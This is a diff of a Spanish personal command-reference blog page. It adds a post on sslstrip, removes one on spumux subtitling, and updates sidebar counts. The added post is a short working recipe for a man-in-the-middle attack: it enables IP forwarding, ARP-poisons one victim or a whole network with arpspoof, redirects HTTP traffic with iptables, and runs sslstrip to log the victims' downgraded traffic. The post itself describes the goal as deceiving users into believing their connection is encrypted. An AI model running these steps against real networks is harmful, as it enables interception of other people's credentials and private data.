@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="La contraseña para acceder por ssh a un host remoto se realiza de forma interactiva (entrándola por teclado) en algunos casos esto no es posible ya &hellip;">
+  <meta name="description" content="Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -75,6 +75,68 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/sslstrip/">Sslstrip</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-27T13:56:00+01:00" pubdate data-updated="true">27-10-2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los datos están siendo transmitidos en abierto [HTTP].</p>
+
+<p>Configuración de reenvío de paquetes IP:</p>
+
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Envenenamiento ARP (paquete dsniff):</p>
+
+<blockquote><p># arpspoof -i eth0 -t ip_victima ip_router</p></blockquote>
+
+<p>En caso de querer atacar toda la red, solo especificar la ip router:</p>
+
+<blockquote><p># arpspoof -i eth0 ip_router</p></blockquote>
+
+<p>Redirección de puertos usando Iptables:</p>
+
+<blockquote><p># iptables -t nat -A PREROUTING -p tcp &#8211;destination-port 80 -j REDIRECT &#8211;to-ports 31715</p></blockquote>
+
+<p>Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar &#8220;-A&#8221; por un &#8220;-D&#8221; en el comando anterior.</p>
+
+<p>Arrancar sslstrip y ponerlo a la escucha:</p>
+
+<blockquote><p># sslstrip -k -f -l 31715 -w archivo.log</p></blockquote>
+
+<p>Visionar en tiempo real los paquetes capturados:</p>
+
+<blockquote><p>#  tail -f archivo.log</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -678,67 +740,6 @@ ForwardX11Trusted yes
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/spumux/">Spumux</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-10-27T13:56:00+01:00" pubdate data-updated="true">27-10-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Generar subtítulos en un video mpeg.</p>
-
-<blockquote><p>$ spumux -s0 subt.xml &lt; video.mpeg > video_subtitulado.mpeg</p></blockquote>
-
-<p>Nota.- El archivo subt.xml con un contenido:</p>
-
-<pre><code>&lt;subpictures&gt;
-
-   &lt;stream&gt;
-
-        &lt;textsub filename="SUBTITULOS.srt" characterset="ISO8859-1"
-
-                 fontsize="24.0" font="Arial.ttf" horizontal-alignment="center"
-
-                 vertical-alignment="bottom" left-margin="60" right-margin="60"
-
-                 top-margin="20" bottom-margin="30" subtitle-fps="25"
-
-                 movie-fps="29.97" movie-width="720" movie-height="478"/&gt;
-
-   &lt;/stream&gt;
-
-&lt;/subpictures&gt;
-</code></pre>
-
-<p>La fuente Arial.ttf ha de estar [o tener un enlace] en el directorio ~/.spumux</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/33/">&larr; Older</a>
@@ -754,12 +755,16 @@ ForwardX11Trusted yes
     <section>
 <h1>Número de entradas</h1>
 	<ul>
-	<li>1319</li>
+	<li>1320</li>
 	</ul>
 </section>
 <section>
   <h1>Añadidos/modificados</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/jot/">jot</a>
+      </li>
     
       <li class="post">
         <a href="/blog/slay/">slay</a>
@@ -795,10 +800,6 @@ ForwardX11Trusted yes
     
       <li class="post">
         <a href="/blog/abs-guide/">abs-guide</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/uuencode/">uuencode</a>
       </li>
     
   </ul>
